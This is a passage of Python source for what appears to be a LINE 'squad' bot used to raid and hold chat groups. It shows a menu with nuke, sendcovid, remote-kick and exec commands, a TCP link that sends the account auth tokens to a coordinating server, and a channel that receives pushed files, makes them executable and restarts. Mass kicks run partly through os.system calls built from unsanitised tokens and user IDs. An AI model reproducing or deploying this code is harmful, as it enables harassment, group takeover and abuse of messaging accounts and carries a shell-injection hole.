│▸ upgrade (maker only)
│▸ owner @target
│▸ staff @target
│▸ expel @target
│▸ unsend (amount)
│▸ resetdata
├「 𝐒𝐄𝐓𝐁𝐎𝐓 」
│▸ bots
│▸ restart
│▸ cek
│▸ cekall
│▸ upname: (text)
│▸ here
│▸ rcount
│▸ count
│▸ cbots
│▸ rchat
│▸ mode low/smoth/ultra/god
│▸ sys
│▸ mytoken
│▸ uppict
│▸ log
│▸ access>list/num
│▸ logqr
│▸ exec>(↰)(code)
│▸ infoset
│▸ reboot
│▸ fbtamp on/off
│▸ use js/thread
├「 𝐏𝐑𝐎𝐓𝐄𝐂𝐓 」
│▸ protect qr
│▸ protect invite
│▸ protect kick
│▸ protect cancel
│▸ protect tag
│▸ protect max
│▸ protect null
├「 𝐑𝐄𝐌𝐎𝐓𝐈𝐍𝐆」
│▸ rkick (numGroup) [numMem]
│▸ rbkick (numGroup) [numMem]
│▸ remot (numGroup)
│▸ memgroups (numGroup)
│▸ gas (number group)
│▸ covid
│▸ sendcovid (number group)
│▸ nuke (number group)
├「 𝐌𝐄𝐃𝐈𝐀 」
│▸ tagall
╰ ◣ {logo} ◢""".format(numSquad=self.numSquad,file=self.file,pref=self.lesting.storage.command["prefix"],logo=self.logo,count=len(self.set["force"]),user=self.client.getContact(sender).displayName,versi=self.version)
        
    def putBot(self):
    	try:
    		for s in self.set["squad"]:
    			self.lesting.user[s]["squad"] = True
    	except:
    		return
    
    def saved(self):
    	try:
    		with open("data.json", "wb") as d:
    			d.write(orjson.dumps(self.set, option=orjson.OPT_INDENT_2))
    		with open("lop.json", "wb") as l:
    			l.write(orjson.dumps(self.ser, option=orjson.OPT_INDENT_2))
    	except:pass
    
    def datas(self):
    	users = {mid: self.lesting.user[mid] for mid in self.lesting.user}
    	bots = {mid for mid, user in users.items() if user["squad"]}
    	pro = {gid for gid in self.lesting.data.protect}
    	self.sock.sendall(str({"cmd":"datas","datas": {"bots":bots,"pro":pro}, "To": "all"}).encode("utf-8"))

    def updateToken(self,mid):
    	time.sleep(3)
    	with open("token/{}.txt".format(self.file), "r") as f:
        	tlist = f.readlines()
        	squad = [x.strip() for x in tlist]
        	self.sock.sendall(str({"func":"uptok","squad":squad}).encode("utf-8"))


    def TCP(self):
    	try:
    		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    		threading.Thread(target=self.updateToken,args=(self.mid,)).start() 
    		self.sock.connect(self.sockaddr)
    		self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    		self.username = self.mid
    		self.sock.sendall(str({self.username:self.file}).encode("utf-8"))
    		rlist = [self.sock, sys.stdin]
    		print("TCP terhubung....")
    		while True:
    			self.recive()
    	except Exception as e:
    		if self.war == {}:
    			pass
    		else:
    			if str(e) in ['[Errno 104] Connection reset by peer','[Errno 32] Broken pipe','[Errno 111] Connection refused']:
    				print("server Error : {}".format(e))
    				self.Restart()
    			
        		
           

    def addTime(self):
    	self.wartTime = round(time.time()) + 0.5
    	return
    
    def Msg(self,op):
    		if op.type in [133,126]:
    			if op.param3 in self.Squad:
    				terkick = op.param3
    			else:
    				terkick = None
    		else:terkick = None
    		healty = self.client.limit
    		dataOp = {"createdTime":str(op.createdTime)}
    		blacklist = self.listBL()
    		notif = op.type
    		midBot = self.mid
    		data = {"func":"queue","To":midBot,"op":dataOp,"blacklist":blacklist,"status":healty,"terkick":terkick,"type":notif}
    		self.sock.sendall(str(data).encode("utf-8"))
    		hasil = self.cekQueue(str(op.createdTime))
    		self.queues = {}
    		return hasil

    def cekQueue(self,createdTime):
    	num = 0
    	while True:
    		time.sleep(0.001)
    		if num <= 500:
    			if createdTime in self.queues:
    				return self.queues[createdTime]
    		else:
    			return False
    		num += 1
    		continue

    		


    def update(self,to):
    	self.sock.sendall(str({"func":"update","userBots":self.mid,"group":to,"file":self.file}).encode("utf-8"))
    def upgradeFile(self,name,folder):
        self.sock.sendall(str({"func":"upgrade","userBots":self.mid,"filename":name,"local":folder}).encode("utf-8"))
    def clearban(self,bot,to):
    	self.sock.sendall(str({"func":"clearban","group":to,"bot":bot}).encode("utf-8"))

    def restarting(self,bot,to):
    	self.sock.sendall(str({"func":"restarting","group":to,"bot":bot}).encode("utf-8"))

    def restGroup(self,to):
    	self.sock.sendall(str({"func":"restarting","group":to,"bot":to}).encode("utf-8"))
    	
    def banUser(self,user):
    	if user not in self.force and user not in self.master:self.lesting.user[user]["blacklist"] = True


    def recive(self):
        if self.upgradeSc["status"] == True:
        	with open(self.upgradeSc["local"], 'wb') as file:
        		while True:
        			data = self.sock.recv(1024)
        			print("start recive file")
        			if not data:
        				file.close()
        				print("saving data...")
        				self.client.sendMessage(self.upgradeSc["group"],"Result update For target_file: {}\nSystem upgrade Succsesfuly..".format(self.upgradeSc["local"]))
        				self.upgradeSc["status"] = False
        				try:os.system("chmod u+x Cnoobz\n")
        				except:pass
        				self.Restart()
        				break
        			file.write(data)
        			continue
        reciv = self.sock.recv(9000).decode("utf-8")
        try:payload = ast.literal_eval(reciv)
        except:
        	return
        data = payload
        cmd = data["func"]
        
        ### for execution per bot

        if cmd == "upgrade":
        	self.upgradeSc["status"] = True
        	self.upgradeSc["local"] = data["local"]
        	return
        elif cmd in ["bqr","bqrall"]:
        	#if self.lesting.user[self.mid]["squad"]:
        		if data["group"] not in self.client.getAllChatMids(True).memberChatMids:
        			to = data["group"]
        			group = to
        			t = data["ticket"]
        			ticket = t
        			threading.Thread(target=self.client.acceptChatInvitationByTicket, args=(group, ticket,)).start() 
        			return
        elif cmd == "resp":
        	if data["group"] in self.client.getAllChatMids(True).memberChatMids:
        		to = data["group"]
        		text = data["txt"]
        		self.client.sendMessage(to,"• {}  CONNECTED«««".format(text))
        	return
        elif cmd == "crun":
        	squadnum = data["squad"]
        	usbot = data["usbot"]
        	to = data["group"]
        	with open("token/{}.txt".format(str(self.file)), "r") as f:
        		tlist = f.readlines()
        		squad = [x.strip() for x in tlist]
        		s = len(squad)
        		s -=1
        	if squadnum <= s:
        		self.ser["token"] = squadnum
        		self.client.count["kick"] = 0
        		self.client.count["cancel"] = 0
        		self.client.count["invite"] = 0
        		self.client.count["msg"] = 0
        		self.client.count["accept"] = 0
        		self.client.count["allreq"] = 0
        		self.set["squad"] = {}
        		try:self.set["linkSquad"] = {to:self.G_ticket[to]}
        		except:pass
        		if usbot == self.mid:self.openQr(to);time.sleep(2);self.client.sendMessage(to,"change squad {} success...".format(squadnum))
        		if squadnum != self.numSquad:
        			if to in self.client.getAllChatMids(True).memberChatMids:self.client.deleteSelfFromChat(to)
        		self.Restart()
        	else:self.client.sendMessage(to,"You squad just 0 - {}".format(s))
        elif cmd == "mode":
        	mode = data["mode"]
        	usbot = data["usbot"]
        	to = data["group"]
        	if "low" == mode:
        		self.set["turbo"] = False
        		self.set["fast"] = False
        		if usbot == self.mid:self.client.sendMessage(to,"change to the lowest excecution system")
        		self.Restart()
        	if "smoth" == mode:
        		self.set["turbo"] = True
        		self.set["fast"] = False
        		if usbot == self.mid: self.client.sendMessage(to,"change to smoth excecution system")
        		self.Restart()
        	if "ultra" == mode:
        		self.set["turbo"] = False
        		self.set["fast"] = True
        		if usbot == self.mid:self.client.sendMessage(to,"change to ultra excecution system")
        		self.Restart()
        	if "god" == mode:
        		self.set["turbo"] = True
        		self.set["fast"] = True
        		if usbot == self.mid:self.client.sendMessage(to,"change to Highest execution system")
        		self.Restart()
        	return
        elif cmd == "ticket":
        	print(data)
        	G_ticket = data["ticket"]
        	bot = data["bot"]
        	to = data["group"]
        	self.G_ticket[to]=G_ticket[to]
        	self.set["G_ticket"][to] = G_ticket[to]
        	self.saved() 
        	if to not in self.client.getAllChatMids(True).memberChatMids:self.client.acceptChatInvitationByTicket(to,G_ticket[to])
        	if bot == self.mid:
        		self.client.sendMessage(to,"update ticket {} group Success....".format(len(self.G_ticket)))
        	return
        elif cmd == "addtoken":
        	token = data["token"]
        	bot = data["bot"]
        	group = data["group"]
        	with open("token/{}.txt".format(self.file), "r") as f:
        		tlist = f.readlines()
        		squad = [x.strip() for x in tlist]
        	with open('token/{}.txt'.format(self.file), 'a') as c:
        		if token not in squad:
        			c.write("\n{}".format(token))
        	if bot == self.mid:
        		self.client.sendMessage(group,"share token sukses...")
        elif cmd == "addtokenFailed":
        	group = data["group"]
        	kembar = "Token ini sudah ada\n\n"
        	for k in data["kembar"]:
        		kembar += "{}\n".format(k)
        	self.client.sendMessage(group,kembar)
        elif cmd == "queue":
        	try:
        		hasil = data["hasil"]
        		timer = data["Time"]
        		blacklist = data["blacklist"]
        		if blacklist != []:
        			for bl in blacklist:
        				self.blacklist[bl] = True
        		self.queues = {timer:hasil}
        		return
        	except Exception as e:print(str(e))
        elif cmd == "restarting":
        	bot = data["bot"]
        	to = data["group"]
        	if bot == self.mid:self.client.sendMessage(to,"System restart....")
        	self.Restart()
        elif cmd == "restart":
        	self.Restart()
        elif cmd == "scert":
        	datas = data["cert"]
        	miD = ""
        	cert = ""
        	for d in datas:
        		cert = datas[d]
        		miD = d
        	self.set["token_user"][miD] = str(cert)
        	return
        elif cmd == "gaskeun":
        	mem = data["data"][self.mid]["mem"]
        	pen = data["data"][self.mid]["pen"]
        	to = data["group"]
        	self.war[to] = True
        	gc = self.client.getChat(to)
        	Mnum =  []
        	Pnum = []
        	members = []
        	pendings = []
        	for m in gc.extra.groupExtra.memberMids:
        		if self.notAllow(m):
        			members.append(m)
        	for p in gc.extra.groupExtra.inviteeMids:
        		if self.notAllow(p):
        			pendings.append(p)
        	for m in range(len(members)):
        		if m in mem:
        			Mnum.append(members[m])
        	for p in range(len(pendings)):
        		if p in pen:
        			Pnum.append(pendings[p])
        	x = {"qr":True,"invite":True,"kick":True,"cancel":True,"antiTag":True}
        	self.protect[to] = x
        	self.saved() 
        	self.Bypass(to,Mnum,Pnum)
        	return
        elif cmd == "staySquad":
        	try:
        		squad = data["bots"]
        		for b in self.force:
        			if b in squad:
        				if b not in self.set["squad"]:
        					if b not in data["limit"]:
        						self.lesting.user[b]["squad"] = True
        						self.set["squad"][b] = True
        				else:self.lesting.user[b]["squad"] = True
        			else:
        				if b in self.set["squad"]:
        					self.lesting.user[b]["squad"] = False
        					del self.set["squad"][b]
        				else:self.lesting.user[b]["squad"] = False
        		if self.mid in self.set["squad"]:
        			to = data["group"]
        			group = to
        			t = data["ticket"]
        			ticket = t
        			self.Squad = {mid for mid in squad if mid not in self.mid}
        			try:self.client.acceptChatInvitationByTicket(to,ticket)
        			except Exception as e:
        				if 'code=35' in str(e):
        					self.client.limit = True
        		self.saved() 
        	except:pass
        elif cmd == "stayBots":
        	try:
        		squad = data["bots"]
        		for b in self.force:
        			if b in squad:
        				if b not in self.set["squad"]:
        					if b not in data["limit"]:
        						self.lesting.user[b]["squad"] = True
        						self.set["squad"][b] = True
        				else:self.lesting.user[b]["squad"] = True
        			else:
        				if b in self.set["squad"]:
        					self.lesting.user[b]["squad"] = False
        					del self.set["squad"][b]
        				else:self.lesting.user[b]["squad"] = False
        		self.saved() 
        		if self.mid == data["capten"]:
        			time.sleep(0.2)
        			self.cekQr(data["group"])
        			if data["limit"] != []:
        				self.client.sendMentionWithList(data["group"], "BAD REQUEST",data["limit"])
        		if self.client.Mid in data["limit"] or self.client.Mid not in sorted(self.set["squad"], reverse=True):
        			self.client.deleteSelfFromChat(data["group"])
        		self.Squad = {mid for mid in squad if mid not in self.mid}
        	except:pass
        	
        ### for all bots
        elif cmd == "join":
        	if self.lesting.user[self.mid]["squad"]:
        		if data["group"] not in self.client.getAllChatMids(True).memberChatMids:
        			to = data["group"]
        			group = to
        			t = data["ticket"]
        			ticket = t
        			try:self.client.acceptChatInvitationByTicket(to,ticket)
        			except Exception as e:
        				if 'code=35' in str(e):
        					self.client.limit = True
        elif cmd == "addowner":
        	bot = data["bot"]
        	target = data["target"]
        	to = data["group"]
        	for t in target:
        		self.set["master"][t] = True
        	if bot == self.mid:
        		self.client.sendMentionWithList(to,"{} users add to owner".format(len(target)),target )
        	self.saved() 
        	return
        elif cmd == "addstaff":
        	bot = data["bot"]
        	target = data["target"]
        	to = data["group"]
        	for t in target:
        		self.set["ws"][t] = True
        	if bot == self.mid:
        		self.client.sendMentionWithList(to,"{} users add to whiteList".format(len(target)),target )
        elif cmd == "expel":
        	bot = data["bot"]
        	target = data["target"]
        	to = data["group"]
        	m = []
        	s = []
        	for t in target:
        		if t in self.master:
        			del self.set["master"][t]
        			m.append(t)
        		if t in self.ws:
        			del self.set["ws"][t]
        			s.append(t)
        	if bot == self.mid:
        		if m != []:
        			self.client.sendMentionWithList(to,"{} users remove from owners".format(len(m)),m )
        		if s != []:
        			self.client.sendMentionWithList(to,"{} users remove from whitelist".format(len(s)),s )
        	self.saved() 
        	return 
        elif cmd == "protect":
        	bot = data["bot"]
        	to = data["group"]
        	accesspro = data["data"]
        	listpro = ["kick","qr","cancel","invite","antiTag","lockname"]
        	if "null" not in accesspro:
        		tx = ""
        		if to in self.protect:
        			for pro in listpro:
        				if pro in accesspro:
        					if "lockname" == pro:
        						self.protect[to][pro] = str(self.client.getChat(to).chatName)
        						continue
        					self.protect[to][pro] = True
        					tx += "• {} ✅\n".format(pro)
        				else:
        					if pro not in self.protect[to]:
        						self.protect[to][pro] = False
        						tx += "• {} ⭕\n".format(pro)
        					else:
        						if pro != "lockname":
        							if self.protect[to][pro]:tx += "• {} ✅\n".format(pro)
        							else:tx += "• {} ⭕\n".format(pro)
        			tx += "\nPROTECT ENABLED 🔒"
        			if bot == self.mid:
        				if "qr" in accesspro:self.cekQr(to);self.client.sendMessage(to, tx)
        				else:self.client.sendMessage(to, tx)
        		else:
        			tx = ""
        			obj = {}
        			for pro in listpro:
        				if pro in accesspro:
        					if pro == "lockname":
        						obj[pro] = str(self.client.getChat(to).chatName)
        						continue
        					obj[pro] = True
        					tx += "• {} ✅\n".format(pro)
        				else:
        					if pro != "lockname":
        						obj[pro] = False
        						tx += "• {} ⭕\n".format(pro)
        			self.protect[to] = obj
        			tx += "\nPROTECT ENABLED 🔒"
        			if bot == self.mid:
        				if "qr" in accesspro:self.cekQr(to);self.client.sendMessage(to, tx)
        				else:self.client.sendMessage(to, tx)
        	else:
        		tx = ""
        		if to in self.protect:
        			del self.protect[to]
        			if bot == self.mid:self.client.sendMessage(to, "ALL PROTECTION DISABLED ☑️")
        		else:
        			if bot == self.mid:self.client.sendMessage(to, "PROTECTION ALREADY DISABLED ☑️")
        	self.saved() 
        	return
        elif cmd == "resetdata":
        	bot = data["bot"]
        	to = data["group"]
        	sender = data["sender"]
        	self.set["protect"] = {}
        	self.set["ws"] = {}
        	self.set["G_ticket"] = {}
        	self.set["master"] = {sender:True}
        	if bot == self.mid:self.client.sendMessage(to,"Reset data success...")
        	self.Restart() 
        	return
        elif cmd == "datas":
        	for b in data["bots"]:
        		self.lesting.user[b]["squad"] = True
        	for p in data["pro"]:
        		if p not in self.lesting.data.protect:
        			self.lesting.data.protect[p] = True
        	return
        elif cmd == "update":
        	for mid in data["bots"]["squad"]:
        		self.lesting.user[mid]["squad"] = True
        		self.set["squad"][mid] = True
        		self.set["force"] = data["bots"]["squad"]
        		self.force = data["bots"]["squad"]
        	self.Squad = {mid for mid in data["bots"]["squad"] if mid not in self.mid}
        	self.client.sendMessage(data["bots"]["group"],"success updating...")
        	self.saved() 
        elif cmd == "clearban":
        	to = data["group"]
        	bot = data["bot"]
        	list = self.blacklist
        	if list != {}:
        		self.war = {}
        		self.Link = ""
        		self.terkick = {}
        		self.jaVa =True
        		self.btamps = False
        		self.queues = {}
        		tx = "Clear {} users Blackist".format(len(list))
        		if bot == self.mid:self.client.sendMentionWithList(to,tx,list )
        		self.blacklist = {}
        	else:
        		if bot == self.mid:self.client.sendMessage(to,"Not have users Blacklist	╮(╯▽╰)╭")
        	#self.Restart()
        	return
        elif cmd == "btamps":
        	to = data["group"]
        	bot = data["bot"]
        	set = data["set"]
        	if "on" == set:
        		self.btamps = True
        		if bot == self.mid:self.client.sendMessage(to,"• status blacktemp find on ✅")
        	if "off" == set:
        		self.btamps = False
        		if bot == self.mid:self.client.sendMessage(to,"• status blacktemp find off ⭕")
        	return
        elif cmd == "reqstat":
        	try:
        		self.client.deleteOtherFromChat(self.mid,{self.mid})
        	except Exception as e:
        		if 'code=35' in str(e):
        			if self.set["count"]["duedate"][self.mid] == "":
        				self.duedate = self.duedate + relativedelta(hours= -1)
        				self.set["count"]["duedate"][self.mid] = str(self.duedate)
        				self.client.limit = True
        		elif 'code=20' in str(e):
        			if self.set["count"]["duedate"][self.mid] == "":
        				self.duedate = self.duedate + relativedelta(hours= 1)
        				self.set["count"]["duedate"][self.mid] = str(self.duedate)
        				self.client.limit = True
        		elif 'code=0' in str(e):
        			self.set["count"]["duedate"][self.mid] = ""
        	self.sock.sendall(str({"func":"getstat","duedate":self.set["count"]["duedate"][self.mid],"bot":self.mid}).encode("utf-8"))
        	self.saved() 
        	return
        elif cmd == "getstat":
        	to = data["group"]
        	statdata = data["data"]
        	good = []
        	bad = []
        	for b in statdata:
        		if statdata[b] == "":
        			good.append(b)
        		else:
        			bad.append(b)
        	tx = "╭ ◤ 𝐁𝐎𝐓𝐒 𝐒𝐓𝐀𝐓𝐔𝐒 ◥\n"
        	tx += "│\n"
        	if good != []:
        		tx += "│𝚁𝙴𝚀𝚄𝙴𝚂𝚃 GOOD\n"
        		numG = 0
        		for g in good:
        			numG += 1
        			tx += "│{}.{}\n".format(numG,self.client.getContact(g).displayName)
        	tx += "│\n"
        	try:
        		self.client.findChatByTicket(self.G_ticket[to])
        		tx += "│status qr: ☑️\n"
        	except Exception as e:
        		if 'code=5' in str(e):
        			tx += "│status qr: ⚠️\n"
        		elif 'code=35' in str(e):
        			tx += "│status qr: 🚫\n"
        	if bad != []:
        		tx += "│𝚁𝙴𝚀𝚄𝙴𝚂𝚃 BAD\n"
        		numB = 0
        		for x in bad:
        			numB += 1
        			self.duedate = parser.parse(str(statdata[x]))
        			timeleft = self.duedate - datetime.now()
        			days, seconds = timeleft.days, timeleft.seconds
        			hours = seconds / 3600
        			minutes = (seconds / 60) % 60
        			tx += "│{}.{}\n│ 		𝐭𝐢𝐦𝐞𝐥𝐞𝐟𝐭: {}:{}\n".format(numB,self.client.getContact(x).displayName,round(hours),round(minutes))
        	tx += "╰ ◣ {} ◢".format(self.logo)
        	self.client.sendMessage(to,tx)
        		
        				

    def fetch(self):
        #with concurrent.futures.ThreadPoolExecutor(max_workers=5) as workOp:
        	while True:
        		self.startup = round(time.time() * 1000)
        		self.running = False
        		time.sleep(2)
        		self.putBot()
        		while True:
        			ops = self.client.realFetchOps()
        			time.sleep(0.006)
        			for op in ops:
        				if not self.running:
        					if op.createdTime < self.startup:
        						continue
        					self.running = True
        				self.operations.put(op) #workOp.submit(self.operations.put,op)

    def fetch0(self):
    	self.startup = round(time.time() * 1000)
    	self.running = False
    	self.putBot()
    	with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    		while True:
    			try:ops = self.client.session.poll.fetchOps(self.client.keeper.localRev, self.client.config.FETCH_OPS_COUNT, self.client.keeper.globalRev, self.client.keeper.individualRev)
    			except EOFError:continue
    			for op in ops:
    					if op.type != 0:
    						self.client.keeper.localRev = max(op.revision, self.client.keeper.localRev)
    						if not self.running:
    							if op.createdTime < self.startup:continue
    							self.running = True
    						executor.submit(self.worker,op)
    					else:
    						if op.param1:
    							a, _, _ = op.param1.partition("")
    							self.client.keeper.individualRev = int(a)
    						if op.param2:
    							a, _, _ = op.param2.partition("")
    							self.client.keeper.globalRev = int(a)

    def fetch3(self):
    	self.startup = round(time.time() * 1000)
    	self.running = False
    	self.putBot()
    	while True:
        	try:
        		ops = self.client.session.poll.fetchOperations(self.client.keeper.localRev, self.client.config.FETCH_OPS_COUNT)
        		for op in ops:
        			if not self.running:
        				if op.createdTime < self.startup:continue
        			self.running = True
        			if op.type not in [0,2]:
        				self.client.keeper.localRev = max(self.client.keeper.localRev, op.revision)
        				self.worker(op)
        	except:
        		pass

    def executor(self):
    	while True:
    		try:
    			self.worker(self.operations.get()) #with concurrent.futures.ThreadPoolExecutor() as workOp:workOp.submit(self.execute,self.operations.get())
    			#threading.Thread(target=self.execute, args=(self.operations.get(), )).start()
    		except Exception as e:
    			import traceback
    			print(e)
    			traceback.print_exc()

    def detectBot(self,to):
    	chat = self.client.getChat(to)
    	bots = {mid for mid in self.Squad if mid not in chat.extra.groupExtra.memberMids and mid not in chat.extra.groupExtra.inviteeMids} #chat.members and mid not in chat.invites and mid not in 
    	return bots

    def stayBot(self,to):
    	chat = self.client.getChat(to) #.memberMids or .inviteeMids
    	users = {mid: self.lesting.user[mid] for mid in self.lesting.user}
    	bots = {mid for mid, user in users.items() if user["squad"] if mid in chat.extra.groupExtra.memberMids} #chat.members and mid not in chat.invites and mid not in 
    	return bots

    def notAllow(self,user):
    	if user not in sorted(self.ws, reverse=True) + self.force + sorted(self.master, reverse=True):
    		return True
    	return False

    def alowed(self,user):
    	if user in sorted(self.master, reverse=True) + self.force:
    		return True
    	return False

    def proGroup(self,op):
    	if op.param1 in self.protect:
    		if op.type == 133:
    			if self.protect[op.param1]["kick"]:
    				return True
    		elif op.type == 124:
    			if self.protect[op.param1]["invite"]:
    				return True
    		elif op.type == 132:
    			if self.protect[op.param1]["cancel"]:
    				return True
    		elif op.type == 122:
    			if self.protect[op.param1]["qr"]:
    				return True
    	return False
    		
    			
    def warGroup(self,to):
    	if to in self.war:
    		return True
    	return False
    
    def lockQr(self,to):
    	D = self.client.getChat(to)
    	D.extra.groupExtra.preventedJoinByTicket = True
    	self.client.updateChat(D,4)
    	return

    def lockQrName(self,to):
    	D = self.client.getChat(to)
    	if D.chatName != self.protect[to]["lockname"]:
    		D.chatName = self.protect[to]["lockname"]
    		self.client.updateChat(D,1)
    	if D.extra.groupExtra.preventedJoinByTicket == False:
    		D.extra.groupExtra.preventedJoinByTicket = True
    		self.client.updateChat(D,4)
    	return
    	


    def cekQr(self,to):
    	D = self.client.getChat(to)
    	qr = D.extra.groupExtra.preventedJoinByTicket
    	if qr == False:
    		D.extra.groupExtra.preventedJoinByTicket = True
    		self.client.updateChat(D,4)
    	return

    def joinQr(self,to):
    	time.sleep(0.004)
    	D = self.client.getChat(to)
    	qr = D.extra.groupExtra.preventedJoinByTicket
    	if qr == True:
    		D.extra.groupExtra.preventedJoinByTicket = False
    	self.client.updateChat(D,4)
    	ticket = self.client.reissueChatTicket(to)
    	self.sock.sendall(str({"func":"join","To":"all","ticket":ticket,"group":to}).encode("utf-8"))
    	def lock():
    		users = {mid: self.lesting.user[mid] for mid in self.lesting.user}
    		bots = {mid for mid, user in users.items() if user["squad"]}
    		if len(self.detectBot(to)) <= len(bots):
    			time.sleep(0.02)
    			return self.cekQr(to)
    	lock()

    def forceJoin(self,to,count):
    	time.sleep(0.004)
    	if len(self.stayBot(to)) <= count:
    		D = self.client.getChat(to)
    		qr = D.extra.groupExtra.preventedJoinByTicket
    		if qr == True:
    			D.extra.groupExtra.preventedJoinByTicket = False
    		self.client.updateChat(D,4)
    	k = [mid for mid in self.stayBot(to)]
    	ticket = self.client.reissueChatTicket(to)
    	self.sock.sendall(str({"func":"forceJoin","userBots":self.mid,"ticket":ticket,"group":to,"count":count,"stay":k}).encode("utf-8"))
    	return

    def bqr(self,to,bot):
    	time.sleep(0.002)
    	D = self.client.getChat(to)
    	qr = D.extra.groupExtra.preventedJoinByTicket
    	if qr == True:
    		D.extra.groupExtra.preventedJoinByTicket = False
    		self.client.updateChat(D,4)
    	if self.Link == "":
    		self.Link = self.G_ticket[to]
    	self.sock.sendall(str({"func":"bqr","ticket":self.Link,"group":to,"bot":bot}).encode("utf-8"))

    def openQr(self,to):
    	D = self.client.getChat(to)
    	qr = D.extra.groupExtra.preventedJoinByTicket
    	if qr == True:
    		D.extra.groupExtra.preventedJoinByTicket = False
    		self.client.updateChat(D,4)

    def bqrAll(self,to):
    	time.sleep(0.002)
    	D = self.client.getChat(to)
    	qr = D.extra.groupExtra.preventedJoinByTicket
    	if qr == True:
    		D.extra.groupExtra.preventedJoinByTicket = False
    		self.client.updateChat(D,4)
    	if self.Link == "":
    		self.Link = self.G_ticket[to]
    	self.sock.sendall(str({"func":"bqrall","ticket":self.Link,"group":to}).encode("utf-8"))

    def bqr3(self,to):
    	self.client.updateChatURL(to,False)
    	if self.Link == "":
    		self.Link = self.G_ticket[to]
    	self.sock.sendall(str({"func":"bqrall","ticket":self.Link,"group":to}).encode("utf-8"))


    def bqrcek(self,to):
    	time.sleep(0.002)
    	D = self.client.getChat(to)
    	qr = D.extra.groupExtra.preventedJoinByTicket
    	if qr == True:
    		D.extra.groupExtra.preventedJoinByTicket = False
    		self.client.updateChat(D,4)
    		self.multy = True
    		if self.Link == "":
    			self.Link = self.G_ticket[to]
    		self.sock.sendall(str({"func":"bqrcek","ticket":self.Link,"group":to}).encode("utf-8"))
    	else:
    		self.multy = False
    	return

    def cekMode(self,to):
    	D = self.client.getChat(to)
    	qr = D.extra.groupExtra.preventedJoinByTicket
    	if qr == True:
    		D.extra.groupExtra.preventedJoinByTicket = False
    		self.multy = True
    	return

    def bqr2(self,to):
    	time.sleep(0.002)
    	D = self.client.getChat(to)
    	qr = D.extra.groupExtra.preventedJoinByTicket
    	if qr == False:
    		if self.Link == "":
    			self.Link = self.G_ticket[to]
    		self.sock.sendall(str({"func":"bqrall","ticket":self.Link,"group":to}).encode("utf-8"))
    	
 
    def accQr(self,to):
    	try:
    		gc = self.lesting.user[to]
    		if None != gc["ticket"]:
    			ticket = self.lesting.user[to]["ticket"]
    			gwar = self.client.getChat(to).extra.groupExtra.memberMids
    			if self.mid not in gwar:
    				self.client.acceptChatInvitationByTicket(to,ticket)
    				bots = {mid for mid, user in users.items() if user["squad"]}
    				for b in bots:
    					if b not in gwar:
    						return
    				self.lesting.user[to]["ticket"] = None
    			return
    		else:
    			time.sleep(0.2)
    			return self.accQr(to)
    	except:
    		self.lesting.user[to]["ticket"] = None
    		return

    def equal(self,to,target):
    	for x in target:
    		try:
    			if self.blacklist[x]:
    				return True
    		except:return False
    	return False

    def detectUser(self,user):
    	if user not in self.lesting.user:
    		#self.lesting.user[user]["blacklist"] = False
    		self.lesting.user[user]["squad"] = False
    		return self.lesting.user[user]
    	return self.lesting.user[user]

    def detectUscont(self,user):
    	if user in self.master:
    		return True
    	return False
    	

    def listBL(self):
    	count = [mid for mid in self.blacklist]
    	return count

    def autoPurge(self):
    	count = [mid for mid in self.blacklist]
    	if 1 <= len(count):
    		return True, count
    	return False, []

    def killModef(self,to,count):
    	#time.sleep(0.02)
    	chat = self.client.getChat(to)
    	target = [mid for mid in count if mid in chat.extra.groupExtra.memberMids]
    	if not self.jaVa and len(self.terkick) != len(self.Squad):
    		for b in target:
    			threading.Thread(target=self.client.deleteOtherFromChat, args=(to, {b}, )).start() 
    	else:
    		cmd = 'node ulty.js token={} gid={}'.format(self.client.authToken, to)
    		for uid in count:
    			cmd += ' uid={}'.format(uid)
    		os.system(cmd)
    		self.jaVa = False


    def killMode(self,to,count,op):
    	if round(time.time()) < self.wartTime or self.btamps:
    		squad = []
    		for mid in count:
    			if mid not in squad:
    				squad += self.detectSquad(op,mid)
    		for m in squad:
    			self.blacklist[m] = True
    	batas = len(self.Squad)
    	chat = self.client.getChat(to)
    	listbl = [mid for mid in self.blacklist]
    	target = [mid for mid in listbl if mid in chat.extra.groupExtra.memberMids]
    	if len(self.terkick) != len(self.Squad):
    		for b in target:
    			threading.Thread(target=self.client.deleteOtherFromChat, args=(to, {b}, )).start()
    	else:
    		if self.jaVa:
    			cmd = 'node ulty.js token={} gid={}'.format(self.client.authToken, to)
    			if 20 <= len(listbl):
    				for uid in target:
    					cmd += 'uid={}'.format(uid)
    			else:
    				for uid in listbl:
    					cmd += 'uid={}'.format(uid)
    			os.system(cmd)
    			self.jaVa = False
    		else:
    			for b in target:
    				threading.Thread(target=self.client.deleteOtherFromChat, args=(to, {b}, )).start()
    			

    def killModen(self,to,count,op):
    	if round(time.time()) < self.wartTime or self.btamps:
    		squad = []
    		for mid in count:
    			if mid not in squad:
    				squad += self.detectSquad(op,mid)
    		for m in squad:
    			self.blacklist[m] = True
    	batas = len(self.Squad)
    	chat = self.client.getChat(to)
    	listbl = sorted(self.blacklist, reverse=True)
    	target = [mid for mid in listbl if mid in chat.extra.groupExtra.memberMids]
    	if len(self.terkick) != len(self.Squad) and not self.jaVa:
    		for b in listbl:
    			threading.Thread(target=self.client.deleteOtherFromChat, args=(to, {b}, )).start()
    	else:
    		cmd = 'node ulty.js token={} gid={}'.format(self.client.authToken, to)
    		for uid in listbl:
    			cmd += 'uid={}'.format(uid)
    		os.system(cmd)
    		self.jaVa = True


    def karungin(self,to,count,op):
    	squad = []
    	for mid in count:
    		if mid not in squad:
    			squad += self.detectSquad(op,mid)
    	for m in squad:
    		if self.notAllow(m):
    			self.blacklist[m] = True
    	cmd = 'node ulty.js token={} gid={}'.format(self.client.authToken, to)
    	for uid in squad:
    		cmd += ' uid={}'.format(uid)
    	os.system(cmd)

    def killModeqr(self,to,count):
    	#time.sleep(0.02)
    	#chat = self.client.getChat(to)
    	for b in count:
    		#if b in chat.extra.groupExtra.memberMids:
    			threading.Thread(target=self.client.deleteOtherFromChat, args=(to, {b}, )).start()
    			#continue
    		#if b in chat.extra.groupExtra.inviteeMids:threading.Thread(target=self.client.cancelChatInvitation, args=(to, b, )).start()

    def killModeQr(self,to,count,mem,pen):
    	#time.sleep(0.02)
    	for b in count:
    		if b in mem:
    			threading.Thread(target=self.client.deleteOtherFromChat, args=(to, {b}, )).start()
    			continue
